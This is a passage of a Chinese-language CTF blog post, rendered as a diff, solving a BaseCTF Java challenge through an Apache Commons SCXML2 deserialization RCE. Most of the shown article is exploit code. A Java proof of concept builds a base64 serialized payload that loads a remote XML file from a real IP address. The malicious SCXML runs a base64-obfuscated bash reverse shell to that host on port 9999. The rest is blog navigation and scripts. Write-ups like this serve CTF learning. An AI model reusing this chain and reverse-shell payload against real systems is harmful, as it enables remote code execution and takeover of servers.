class="line">                (<span class="keyword">new</span> <span class="title class_">AsyncTrigger</span>(<span class="built_in">this</span>.parentSCInstance.getExecutor(), te)).start();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">cancel</span><span class="params">()</span> <span class="keyword">throws</span> InvokerException &#123;</span><br><span class="line">        <span class="built_in">this</span>.cancelled = <span class="literal">true</span>;</span><br><span class="line">        <span class="type">TriggerEvent</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TriggerEvent</span>(<span class="built_in">this</span>.eventPrefix + invokeCancelResponse, <span class="number">3</span>);</span><br><span class="line">        (<span class="keyword">new</span> <span class="title class_">AsyncTrigger</span>(<span class="built_in">this</span>.parentSCInstance.getExecutor(), te)).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>里面很明显有SCXML的RCE漏洞</p>
+<p>链子很简单：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.n1ght.InvokerImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCInstance;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.SCXMLExecutor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.env.jexl.JexlEvaluator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.scxml2.invoke.SimpleSCXMLInvoker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SimpleSCXMLInvoker</span> <span class="variable">simpleSCXMLInvoker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleSCXMLInvoker</span>();</span><br><span class="line">        <span class="comment">//通过反射构造出一个伪造的 SCInstance 对象，并把它注入SimpleSCXMLInvoker中的parentSCInstance参数</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> SCInstance.class.getDeclaredConstructor(SCXMLExecutor.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">SCInstance</span> <span class="variable">sci</span> <span class="operator">=</span> (SCInstance) constructor.newInstance(<span class="keyword">new</span> <span class="title class_">SCXMLExecutor</span>());</span><br><span class="line">        setValue(sci,<span class="string">&quot;evaluator&quot;</span>,<span class="keyword">new</span> <span class="title class_">JexlEvaluator</span>());</span><br><span class="line">        setValue(simpleSCXMLInvoker,<span class="string">&quot;parentSCInstance&quot;</span>,sci);</span><br><span class="line"></span><br><span class="line">        String str=<span class="string">&quot;http://8.148.211.47/shell.xml&quot;</span>;</span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">InvokerImpl</span> <span class="variable">invoker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerImpl</span>(simpleSCXMLInvoker,str,map);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">            objout.writeObject(invoker);</span><br><span class="line">            objout.close();</span><br><span class="line">            out.close();</span><br><span class="line">            <span class="type">byte</span>[] ObjectBytes = out.toByteArray();</span><br><span class="line">            <span class="type">String</span> <span class="variable">base64EncodedValue</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(ObjectBytes);</span><br><span class="line">            System.out.println(base64EncodedValue);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj,String name,Object value)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>恶意XML:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scxml</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2005/07/scxml&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">initial</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">state</span> <span class="attr">id</span>=<span class="string">&quot;run&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">onentry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">                                <span class="string">&#x27;&#x27;</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getRuntime</span>().<span class="title function_">exec</span>(<span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjE0OC4yMTEuNDcvOTk5OSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">                        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">onentry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">state</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">scxml</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行就能生成payload了，但由于这里的com.n1ght.InvokerImpl是高版本JDK打包生成的，我的是JDK8，就会编译失败，但我懒得搞了…</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag">JAVA安全</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/SCXML2-RCE/" rel="tag">SCXML2 RCE</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/1715139851115171513985117.jpg" data-sizes="auto" alt="JsonPickle反序列化" class="lazyload">
+          
+        
+        <a href="/2025/10/07/JsonPickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            JsonPickle反序列化
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/17369576223624.jpg" data-sizes="auto" alt="NKCTF2023-Crypto复现" class="lazyload">
+        
+      
+      <a href="/2025/10/07/NKCTF2023-Crypto%E5%A4%8D%E7%8E%B0/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          NKCTF2023-Crypto复现
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text"> 前置知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text"> 题解</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "BaseCTF一道JAVA题-SCXMl",
+          url: "http://example.com/2025/10/07/BaseCTF%E4%B8%80%E9%81%93JAVA%E9%A2%98-SCXMl/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC]  前置知识 Apache SCXML2 RCE漏洞-CSDN博客 通过SCXML scxml = SCXMLReader.read(filename);来读取恶意XMl文件 然后 123456// 初始化执行器SCXMLExecutor executor = new SCXMLExecutor();//设置状态机executor.setStateMachine(scxml);// 启动状态机执行executor.go(); 构造XML-payload看上述博客 可以通过访问外部恶意X",
+          date: "Tue Oct 07 2025 17:10:20 GMT+0800",
+          updated: "Wed Dec 17 2025 00:25:41 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
